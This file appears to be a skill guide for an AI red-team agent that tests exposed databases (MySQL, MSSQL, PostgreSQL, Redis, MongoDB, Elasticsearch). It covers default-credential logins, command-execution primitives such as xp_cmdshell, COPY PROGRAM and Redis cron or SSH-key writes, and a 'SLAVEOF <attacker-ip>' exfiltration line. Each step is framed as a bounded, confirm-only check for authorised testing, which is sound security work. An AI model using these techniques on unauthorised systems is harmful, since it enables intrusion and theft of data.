---
name: database-services
description: Test exposed database services (MySQL, MSSQL, PostgreSQL, MongoDB, Redis, Elasticsearch) for unauth access, default creds, and RCE
origin: RedteamOpencode
---

# Database Services

## When to Activate

- Ports 1433 (MSSQL), 3306 (MySQL/MariaDB), 5432 (PostgreSQL), 27017 (MongoDB),
  6379 (Redis), 9200/9300 (Elasticsearch), 5984 (CouchDB), 11211 (Memcached)
- Database ports reachable from the engagement scope

## Tools

`run_tool nmap`, `mysql`, `psql`, `mssqlclient.py` (impacket), `redis-cli`, `mongosh`/`mongo`,
`curl` (ES/CouchDB), Metasploit (exploit phase).

## Methodology

### 1. Fingerprint
```bash
run_tool nmap -sV -p PORT --script <db>-info,<db>-databases HOST
```

### 2. Unauthenticated / Default Credentials
```bash
# MySQL
run_tool mysql -h HOST -u root -proot -e 'SELECT VERSION();'
run_tool mysql -h HOST -u root --skip-password -e 'SHOW DATABASES;'
# PostgreSQL
run_tool psql "host=HOST user=postgres password=postgres dbname=postgres" -c 'SELECT version();'
# MSSQL
run_tool mssqlclient.py USER:PASS@HOST -windows-auth -query 'SELECT @@version'
# Redis (often no auth)
run_tool redis-cli -h HOST INFO
# MongoDB (often no auth)
run_tool mongosh "mongodb://HOST:27017" --eval 'db.adminCommand({listDatabases:1})'
# Elasticsearch (often open)
run_tool curl -s http://HOST:9200/_cat/indices
```

### 3. Config / Version CVE Mapping
`searchsploit <product> <version>`; check CVEs for the exact build.

### 4. Confirm Exploitability (bounded, one primitive)

| DB | Primitive | Bounded check |
|---|---|---|
| MySQL | file write / UDF | `SELECT @@secure_file_priv;` then one `INTO OUTFILE` to a web path |
| MySQL | UDF RCE (`sys_exec`/`sys_eval`) | confirm `plugin_dir` is writable and `FILE` priv held — do not upload the shared lib here |
| MSSQL | `xp_cmdshell` | `EXEC sp_configure 'show advanced options',1` → confirm only |
| MSSQL | linked server chaining | `SELECT * FROM sys.servers;` then `EXEC ('SELECT @@version') AT [LINKED_SRV]` — confirm reachable linked servers as a pivot, do not chain exploitation |
| PostgreSQL | `COPY ... TO/FROM PROGRAM` | `SELECT current_setting('is_superuser');` — superuser + `COPY PROGRAM` = command exec |
| PostgreSQL | large object (`lo_import`/`lo_export`) local file read | confirm `pg_largeobject` access without superuser |
| Redis | config write RCE (webshell/SSH key/cron) | `CONFIG GET dir` / `CONFIG SET dir` probe (no full RCE here) |
| Redis | unauth replication (`SLAVEOF`) data exfil | confirm `SLAVEOF NO ONE` accepted without auth — do not attach a rogue master |
| MongoDB | unauth data | list DBs/collections, sample one doc |
| MongoDB | `$where`/server-side JS eval | confirm `eval()` command is enabled, do not run a payload |
| Elasticsearch | script/RCE CVE | version check + one known CVE probe (e.g. CVE-2015-1427 Groovy sandbox escape, CVE-2014-3120 dynamic scripting) |
| CouchDB | unauth admin (`_config`) | `curl http://HOST:5984/_all_dbs` then check `/_membership` for anonymous admin party (pre-2.x default) |
| Memcached | unauth key dump / amplification | `stats items` then `stats cachedump` on one slab — note UDP amplification risk (port 11211/udp), do not flood |

Do NOT run destructive statements. Read-only proof + one command-exec primitive max;
hand the exploit to `exploit-developer`.

### 4b. Post-Access Privilege Escalation (confirm only)
- [ ] MySQL: check `mysql.user` for `Grant_priv`/`Super_priv` on the connected account; a `FILE`-privileged low user combined with a web-writable path is a webshell chain
- [ ] MSSQL: enumerate impersonation — `SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'`; a grant on `sa` is an escalation primitive, do not `EXECUTE AS` yourself — hand off to exploit-developer
- [ ] PostgreSQL: check for `pg_read_server_files`/`pg_write_server_files` role membership on PG 11+ as a `COPY`-restriction bypass path

### 4c. Redis Unauth-to-RCE Primitives (confirm only, do not weaponize)
- [ ] **Classic cron-write chain** (pre-`protected-mode`/no `requirepass`): confirm the primitive without writing a real payload — `CONFIG GET dir`, `CONFIG GET dbfilename`, and whether `CONFIG SET dir /var/spool/cron/` is accepted; report the writable-cron-path chain, do not `SAVE` a crontab entry.
- [ ] **SSH `authorized_keys` write chain**: same `CONFIG SET dir`/`dbfilename` primitive redirected at `~/.ssh/` — confirm the target directory is writable by the Redis process (`INFO server` for `run_id`/`os` to infer the service account), do not write a key.
- [ ] **`MODULE LOAD` RCE** (Redis 4+ with modules enabled): confirm the command is reachable and not blocked — `COMMAND INFO module` / attempt `MODULE LIST`; a reachable `MODULE LOAD` on an unauthenticated instance is a direct native-code-execution primitive (loading a malicious `.so`), do not actually load one.
- [ ] **Lua sandbox / `EVAL` primitive** (Redis <7 ACL-unaware deployments): confirm `EVAL "return 1" 0` succeeds unauthenticated; historical sandbox-escape CVEs (e.g. CVE-2022-24735/24736) chain through `EVAL` — version-map before assuming exploitability.
- [ ] **Replication-based dump exfil**: `SLAVEOF <attacker-ip> <port>` forces the target to replicate its full dataset to an attacker-controlled listener without ever touching the target's filesystem — confirm command acceptance only (already noted in the main table); this is the RCE-avoidance alternative to the `CONFIG SET dir` chain when file write isn't viable.

### 4d. MSSQL / MongoDB / PostgreSQL Additional Primitives
- [ ] **MSSQL — `xp_cmdshell` disabled fallback**: when `sp_configure` shows `xp_cmdshell` off and re-enabling isn't appropriate, check `OPENROWSET`/`OPENQUERY` ad-hoc distributed query access (`sp_configure 'Ad Hoc Distributed Queries'`) as an alternative command-execution-adjacent primitive, and `xp_dirtree`/`xp_fileexist` for outbound SMB auth-capture (relay trigger, see `smb-netbios`).
- [ ] **MSSQL — linked-server `xp_cmdshell` chaining**: if a reachable linked server (`sys.servers`) itself has `xp_cmdshell` enabled, `EXEC ('EXEC master..xp_cmdshell ''whoami''') AT [LINKED_SRV]` extends command exec through the trust chain — confirm reachability only, do not execute a real command.
- [ ] **MongoDB — legacy no-auth default**: pre-3.0 default `bind_ip 0.0.0.0` with no `--auth` is a straight unauthenticated data primitive; confirm via `db.adminCommand({listDatabases:1})` (already in step 2) and separately confirm write access with a single non-destructive `db.test.insertOne({probe:true})` on a scratch collection, then remove it.
- [ ] **MongoDB — deprecated `MONGODB-CR` auth downgrade**: `db.runCommand({connectionStatus:1})` reveals the negotiated auth mechanism; an instance still accepting `MONGODB-CR` (removed as default in 4.0) instead of SCRAM is a weaker-hash credential-capture target.
- [ ] **PostgreSQL — untrusted extension load**: `SELECT * FROM pg_available_extensions;` then check whether the connected role has `CREATEROLE`/superuser to `CREATE EXTENSION` an untrusted procedural-language extension (e.g. `plperlu`, `plpythonu`) — confirm availability only, do not load one.

### 5. Data Handling
Any credential/hash/PII extracted → `$DIR/auth.json` + Credentials intel table; treat as a
sensitive-data finding (see `sensitive-data-detection` skill).

## Budget

`--host-timeout 120s`. One auth attempt per default credential pair. No unbounded dumps.
